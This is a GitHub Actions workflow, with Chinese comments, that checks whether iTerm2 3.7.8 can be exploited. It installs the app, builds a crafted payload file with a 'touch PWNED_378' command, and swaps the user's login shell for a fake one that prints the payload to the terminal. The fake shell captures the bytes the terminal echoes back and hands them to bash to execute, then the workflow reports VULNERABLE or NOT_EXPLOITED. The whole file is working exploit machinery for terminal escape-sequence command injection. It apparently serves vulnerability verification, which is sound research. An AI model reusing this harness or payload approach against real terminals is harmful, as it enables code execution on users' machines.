name: macos-verify2

on:
  push:
    branches: [main]
    paths:
      - '.github/workflows/macos-verify2.yml'
      - 'tools/**'
  workflow_dispatch:

jobs:
  cap-378:
    runs-on: macos-latest
    timeout-minutes: 25
    env:
      ITERM_VER: "3_7_8"
      MODE: "newline"
      MARKER: "PWNED_378"
      RUNDIR: "/tmp/run-cap-378"
    steps:
      - uses: actions/checkout@v4

      - name: Environment
        run: |
          sw_vers
          uname -m
          echo "user=$USER home=$HOME"
          pgrep -l WindowServer || echo NO_WINDOWSERVER

      - name: Download iTerm2
        run: |
          set -eux
          curl -L --max-time 600 -o /tmp/i.zip "https://iterm2.com/downloads/stable/iTerm2-${ITERM_VER}.zip"
          mkdir -p /tmp/i
          unzip -q /tmp/i.zip -d /tmp/i
          xattr -dr com.apple.quarantine /tmp/i/iTerm.app || true
          /usr/libexec/PlistBuddy -c "Print :CFBundleShortVersionString" /tmp/i/iTerm.app/Contents/Info.plist
          # 关键：装进 /Applications，不然 iTerm2 会弹 "Move to Applications folder?"
          # 那个模态框会挡住一切，窗口都开不出来
          sudo rm -rf "/Applications/iTerm.app"
          sudo cp -R /tmp/i/iTerm.app /Applications/
          ls -ld /Applications/iTerm.app
          # 预置偏好，跳过所有首次运行提示
          defaults write com.googlecode.iterm2 SUHasLaunchedBefore -bool true
          defaults write com.googlecode.iterm2 NoSyncSuppressRestoreMessage -bool true
          defaults write com.googlecode.iterm2 NoSyncDoNotAskAboutEmptySessions -bool true
          defaults write com.googlecode.iterm2 PromptOnQuit -bool false
          defaults write com.googlecode.iterm2 NoSyncSuppressBroadcastInputWarning -bool true
          defaults write com.googlecode.iterm2 NoSyncSuppressClipboardAccessDeniedWarning -bool true

      - name: Build payload
        run: |
          set -eux
          # 命令里不能有 / —— macOS 报错只保留 basename，斜杠会把命令截断
          python3 tools/make_payload.py --mode "$MODE" --cmd "touch $MARKER" --out /tmp/payload.md
          echo "--- payload od ---"
          od -c /tmp/payload.md | head -12

      - name: Install fake login shell
        run: |
          set -eux
          cat > /tmp/lsh.sh <<'LSHEOF'
          #!/bin/bash
          LOG=/tmp/lsh.log
          log() { echo "$*" >>"$LOG"; }

          log "=== login shell started $(date) ==="
          log "TTY: $(tty)"
          log "TERM: $TERM"
          log "iTerm session: ${ITERM_SESSION_ID:-unset}"

          sleep 3
          log "--- catting payload (stdout MUST go to the PTY) ---"

          # >>> 这一行是核心：输出到真正的终端 <<<
          cat /tmp/payload.md

          log "--- cat done ---"
          log "timeout available: $(command -v timeout || echo NO)"

          # 从 PTY 输入抓响应字节（短窗口，避免和后面的 bash 抢 stdin）
          sleep 2
          cat > /tmp/captured.bin 2>/dev/null &
          CATPID=$!
          sleep 3
          kill $CATPID 2>/dev/null
          wait $CATPID 2>/dev/null
          BYTES=$(wc -c < /tmp/captured.bin 2>/dev/null || echo 0)
          log "captured $BYTES bytes"
          if [ "$BYTES" -gt 0 ]; then
            od -c /tmp/captured.bin >>"$LOG" 2>&1
            od -An -tx1 /tmp/captured.bin | tr -d ' \n' > /tmp/captured.hex
          fi

          # 关键：赶紧 exec 交互 bash，让它去读 PTY 里剩下的响应并执行
          # 之前这里 sleep 70，导致 workflow 检查完了命令还没跑
          log "--- exec bash now ---"
          exec /bin/bash -l

          LSHEOF
          chmod +x /tmp/lsh.sh
          echo "--- /tmp/lsh.sh ---"
          cat /tmp/lsh.sh
          # 加进允许的 shell 列表并切过去
          if ! grep -qx /tmp/lsh.sh /etc/shells 2>/dev/null; then
            echo /tmp/lsh.sh | sudo tee -a /etc/shells
          fi
          sudo chsh -s /tmp/lsh.sh "$USER"
          echo "--- current shell ---"
          dscl . -read /Users/$USER UserShell

      - name: Clean
        run: |
          rm -f "$HOME/$MARKER" /tmp/x /tmp/captured.bin /tmp/captured.hex /tmp/lsh.log

      - name: Launch iTerm2
        run: |
          open -a /Applications/iTerm.app
          sleep 25
          pgrep -l iTerm || echo ITERM_NOT_RUNNING
          echo "--- windows ---"
          osascript -e 'tell application "System Events" to tell process "iTerm2" to get name of every window' 2>&1 || true

      - name: Wait for capture
        run: |
          for i in $(seq 1 12); do
            sleep 5
            if [ -f /tmp/captured.hex ]; then
              echo "captured.hex appeared after $((i*5))s"
              break
            fi
          done

      - name: Report
        if: always()
        run: |
          echo "=============== REPORT cap-378 ==============="
          echo "--- lsh.log ---"
          cat /tmp/lsh.log 2>/dev/null | head -80 || echo "(no lsh.log)"
          echo ""
          echo "--- captured.hex ---"
          if [ -f /tmp/captured.hex ]; then
            echo "HEX: $(cat /tmp/captured.hex)"
            echo "BYTES: $(wc -c < /tmp/captured.bin)"
            echo "--- printable ---"
            cat -v /tmp/captured.bin | head -20
          else
            echo "NO_CAPTURE"
          fi
          echo ""
          echo "--- marker ---"
          if [ -f "$HOME/$MARKER" ]; then
            echo "[RESULT] VULNERABLE"
            ls -la "$HOME/$MARKER"
          else
            echo "[RESULT] NOT_EXPLOITED"
          fi

      - name: Screenshot
        if: always()
        run: screencapture -x /tmp/shot.png 2>/dev/null || true

      - name: Upload
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: ev2-cap-378
          path: |
            /tmp/payload.md
            /tmp/captured.bin
            /tmp/captured.hex
            /tmp/lsh.log
            /tmp/shot.png
          if-no-files-found: warn
